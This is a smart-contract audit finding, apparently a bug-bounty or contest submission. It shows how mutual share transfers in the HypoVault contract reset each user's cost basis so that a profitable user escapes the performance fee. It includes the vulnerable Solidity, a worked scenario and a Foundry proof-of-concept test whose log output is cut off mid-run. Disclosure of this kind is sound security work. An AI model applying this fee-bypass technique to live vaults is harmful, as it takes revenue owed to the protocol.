      "body": "## Summary\n\nPerformance fee is charged for the user with a positive PNL in the vault. PNL is calculated by withdrawal amount redeemed by share balance minus principal represented by `userBasis`.\n\n```solidity\nuint256 performanceFee = (uint256(\n    Math.max(0, int256(assetsToWithdraw) - int256(withdrawnBasis))\n) * performanceFeeBps) / 10_000;\n```\n\nHowever, `userBasis` can be changed after user deposits through transfers. `transfer()` and `transferFrom()` allow users to transfer `balance` and `userBasis` proportionally at the same time.\n\nBetween different users, multiple transfers can make `balance` unchanged (representing the same withdrawable amount despite fees) while changing `userBasis` (representing the principal which should have been constant). Then the winning user can fabricate a non-positive PNL to bypass the performance fee.\n\n## Finding Description\n\nHypoVault shares are ERC-20 tokens, which implement transfer functions. In `HypoVault::transfer()`:\n\n```solidity\nfunction transfer(address to, uint256 amount) public override returns (bool success) {\n    _transferBasis(msg.sender, to, amount);\n    return super.transfer(to, amount);\n}\n\nfunction _transferBasis(address from, address to, uint256 amount) internal {\n    uint256 fromBalance = balanceOf[from];\n    if (fromBalance == 0) return;\n\n    uint256 fromBasis = userBasis[from];\n    uint256 basisToTransfer = (fromBasis * amount) / fromBalance;\n\n    userBasis[from] = fromBasis - basisToTransfer;\n    userBasis[to] += basisToTransfer;\n}\n```\n\nWe can see `userBasis` is transferred with user balance. The two variables `userBasis[user]` and `balanceOf[user]` are designed to follow such an invariant:\n\n$$\n\\forall \\text{user} \\in \\text{Users}: \\begin{cases}\n\\text{balanceOf}[\\text{user}] = 0 \\iff \\text{userBasis}[\\text{user}] = 0 \\\\\n\\text{balanceOf}[\\text{user}] > 0 \\implies \\frac{\\text{balanceOf}[\\text{user}]}{\\text{userBasis}[\\text{user}]} = k \\text{ (constant)}\n\\end{cases}\n$$\n\nHowever, the following scenario shows how the constant `k` ratio can be broken:\n\n1. `s` represents shares (balanceOf[user]). We suppose share and funds is 1:1.\n2. `p` represents principal (userBasis[user]).\n3. Next we will suppose the initial states of Alice (loser) and Bob (winner).\n4. Alice: (10s, 12p). Bob: (20s, 18p).\n5. Bob has made a profit, so he wants to exit now. But if he exits immediately, he must pay performance fee with a positive `PNL = 20 - 18 = 2`. So he decides to make a trade with Alice, who loses money at the moment and does not want to exit.\n6. Bob persuades Alice to transfer `10s` to him first.\n7. Alice: (0s, 0p). Bob: (30s, 30p).\n8. Bob transfers back `10s` to Alice.\n9. Alice: (10s, 10p). Bob: (20s, 20p).\n10. Alice and Bob have no loss in shares after the transfers. Alice loses money but has a 0 PNL. Bob wins money but also has a 0 PNL.\n11. If Bob exits now, he will not have to pay a performance fee. If Alice exits now, she also will not pay a performance fee, and neither would she have before. So Alice never suffers a loss regarding fees, and the trade with Bob does no harm. If Alice decides to stay in the vault, when she makes a profit, she can also do the same trade with others.\n\n(The scenario above is also shown in the POC section.)\n\nThe performance fee follows a non-positive-then-zero mechanism, which means the vault operates as a non-zero-sum game. If more users with negative PNL are willing to exit, and more users with positive PNL make trades with them (winners bypass fees and losers get compensated somehow), then it will cause more harm to the protocol's interests. After all, it is unfair to allow any bypass of fees.\n\n## Recommendation\n\nConsider enforcing full transfer or redesigning the balance-basis relationship and performance fee calculation.",
      "proofOfConcept": "To present the vulnerability clearly, we will set up an ideal model in the PoC as stated in the above description. Charlie is introduced to mint initial shares. Only the underlying token balance of the HypoVault contract is accounted for in the NAV. The balance will change apart from deposits and withdrawals to simulate NAV changes.\n\n1. Modify `/test/POC.t.sol`:\n\n```solidity\n    function test_submissionValidity() external {\n        console2.log(\"Charlie deposits 10 ether\");\n        vm.prank(Charlie);\n        vault.requestDeposit(10 ether);\n        vm.startPrank(Manager);\n        mockAccountant.setExpectedVault(address(vault));\n        mockAccountant.setNav(token.balanceOf(address(vault)));\n        vault.fulfillDeposits(10 ether, \"\");\n        vault.executeDeposit(Charlie, 0);\n        vm.stopPrank();\n\n        _logUserStates();\n\n        console2.log(\"Vault NAV increases by 2 ether\");\n        deal(address(token), address(vault), token.balanceOf(address(vault)) + 2 ether);\n\n        console2.log(\"Alice deposits 12 ether\");\n        vm.prank(Alice);\n        vault.requestDeposit(12 ether);\n        vm.startPrank(Manager);\n        mockAccountant.setNav(token.balanceOf(address(vault)));\n        vault.fulfillDeposits(12 ether, \"\");\n        vault.executeDeposit(Alice, 1);\n        vm.stopPrank();\n\n        _logUserStates();\n\n        console2.log(\"Vault NAV decreases by 6 ether\");\n        deal(address(token), address(vault), token.balanceOf(address(vault)) - 6 ether);\n\n        console2.log(\"Bob deposits 18 ether\");\n        vm.prank(Bob);\n        vault.requestDeposit(18 ether);\n        vm.startPrank(Manager);\n        mockAccountant.setNav(token.balanceOf(address(vault)));\n        vault.fulfillDeposits(18 ether, \"\");\n        vault.executeDeposit(Bob, 2);\n        vm.stopPrank();\n\n        _logUserStates();\n\n        console2.log(\"Vault NAV increases by 4 ether\");\n        deal(address(token), address(vault), token.balanceOf(address(vault)) + 4 ether);\n\n        _logUserStates();\n\n        console2.log(\"Alice transfers all her shares to Bob\");\n        vm.prank(Alice);\n        vault.transfer(Bob, 10e6 ether);\n\n        _logUserStates();\n\n        console2.log(\"Bob transfers back Alice's shares\");\n        vm.prank(Bob);\n        vault.transfer(Alice, 10e6 ether);\n\n        _logUserStates();\n\n        emit log_named_decimal_uint(\"Fee Wallet Balance Before Withdrawal\", token.balanceOf(FeeWallet), 18);\n\n        console2.log(\"Alice, Bob, and Charlie withdraw all their assets\");\n        vm.prank(Alice);\n        vault.requestWithdrawal(10e6 ether);\n        vm.prank(Bob);\n        vault.requestWithdrawal(20e6 ether);\n        vm.prank(Charlie);\n        vault.requestWithdrawal(10e6 ether);\n        vm.startPrank(Manager);\n        mockAccountant.setNav(token.balanceOf(address(vault)));\n        vault.fulfillWithdrawals(40e6 ether, type(uint256).max, \"\");\n        vault.executeWithdrawal(Alice, 0);\n        vault.executeWithdrawal(Bob, 0);\n        vault.executeWithdrawal(Charlie, 0);\n        vm.stopPrank();\n\n        _logUserStates();\n\n        emit log_named_decimal_uint(\"Fee Wallet Balance After Withdrawal\", token.balanceOf(FeeWallet), 18);\n    }\n\n    function _logUserStates() internal {\n        emit log(\"===================\");\n        emit log_named_decimal_uint(\"Alice Balance\", vault.balanceOf(Alice), 18);\n        emit log_named_decimal_uint(\"Alice Basis\", vault.userBasis(Alice), 18);\n        emit log_named_decimal_uint(\"Bob Balance\", vault.balanceOf(Bob), 18);\n        emit log_named_decimal_uint(\"Bob Basis\", vault.userBasis(Bob), 18);\n        emit log_named_decimal_uint(\"Charlie Balance\", vault.balanceOf(Charlie), 18);\n        emit log_named_decimal_uint(\"Charlie Basis\", vault.userBasis(Charlie), 18);\n        emit log_named_decimal_uint(\"Total Supply\", vault.totalSupply(), 18);\n        emit log_named_decimal_uint(\"Vault NAV\", token.balanceOf(address(vault)), 18);\n        emit log(\"===================\");\n    }\n```\n\n2. Run with `forge test --mt test_submissionValidity -vvv`:\n\n```shell\nRan 1 test for test/PoC.t.sol:PoC\n[PASS] test_submissionValidity() (gas: 1122312)\nLogs:\n  Charlie deposits 10 ether\n  ===================\n  Alice Balance: 0.000000000000000000\n  Alice Basis: 0.000000000000000000\n  Bob Balance: 0.000000000000000000\n  Bob Basis: 0.000000000000000000\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 10000000.000000000001000000\n  Vault NAV: 10.000000000000000000\n  ===================\n  Vault NAV increases by 2 ether\n  Alice deposits 12 ether\n  ===================\n  Alice Balance: 10000000.000000000000166666\n  Alice Basis: 12.000000000000000000\n  Bob Balance: 0.000000000000000000\n  Bob Basis: 0.000000000000000000\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 20000000.000000000001166666\n  Vault NAV: 24.000000000000000000\n  ===================\n  Vault NAV decreases by 6 ether\n  Bob deposits 18 ether\n  ===================\n  Alice Balance: 10000000.000000000000166666\n  Alice Basis: 12.000000000000000000\n  Bob Balance: 20000000.000000000000055554\n  Bob Basis: 18.000000000000000000\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 40000000.000000000001222220\n  Vault NAV: 36.000000000000000000\n  ===================\n  Vault NAV increases by 4 ether\n  ===================\n  Alice Balance: 10000000.000000000000166666\n  Alice Basis: 12.000000000000000000\n  Bob Balance: 20000000.000000000000055554\n  Bob Basis: 18.000000000000000000\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 40000000.000000000001222220\n  Vault NAV: 40.000000000000000000\n  ===================\n  Alice transfers all her shares to Bob\n  ===================\n  Alice Balance: 0.000000000000166666\n  Alice Basis: 0.000000000000000001\n  Bob Balance: 30000000.000000000000055554\n  Bob Basis: 29.999999999999999999\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 40000000.000000000001222220\n  Vault NAV: 40.000000000000000000\n  ===================\n  Bob transfers back Alice's shares\n  ===================\n  Alice Balance: 10000000.000000000000166666\n  Alice Basis: 10.000000000000000000\n  Bob Balance: 20000000.000000000000055554\n  Bob Basis: 20.000000000000000000\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 40000000.000000000001222220\n  Vault NAV: 40.000000000000000000\n  ===================\n  Fee Wallet Balance Before Withdrawal: 0.000000000000000000\n  Alice, Bob, and Charlie withdraw all their assets\n  ===================\n  Alice Balance: 0.000000000000166666\n  Alice Basis: 0.000000000000000001\n  Bob Balance: 0.000000000000055554\n  Bob Basis: 0.000000000000000001\n  Charlie Balance: 0.000000000000000000\n  Charlie Basis: 0.000000000000000000\n  Total Supply: 0.000000000001222220\n  Vault NAV: 0.000000000000000003\n  ===================\n  Fee Wallet Balance After Withdrawal: 0.000000000000000000\n```\n\n3. Comment mutual transfer snippet and rerun:\n\n```solidity\n// console2.log(\"Alice transfers all her shares to Bob\");\n// vm.prank(Alice);\n// vault.transfer(Bob, 10e6 ether);\n\n// _logUserStates();\n\n// console2.log(\"Bob transfers back Alice's shares\");\n// vm.prank(Bob);\n// vault.transfer(Alice, 10e6 ether);\n\n// _logUserStates();\n```\n\n```shell\n...\n  Fee Wallet Balance Before Withdrawal: 0.000000000000000000\n  Alice, Bob, and Charlie withdraw all their assets\n  ===================\n  Alice Balance: 0.000000000000166666\n  Alice Basis: 0.000000000000000001\n  Bob Balance: 0.000000000000055554\n  Bob Basis: 0.000000000000000001\n  Charlie Balance: 0.000000000000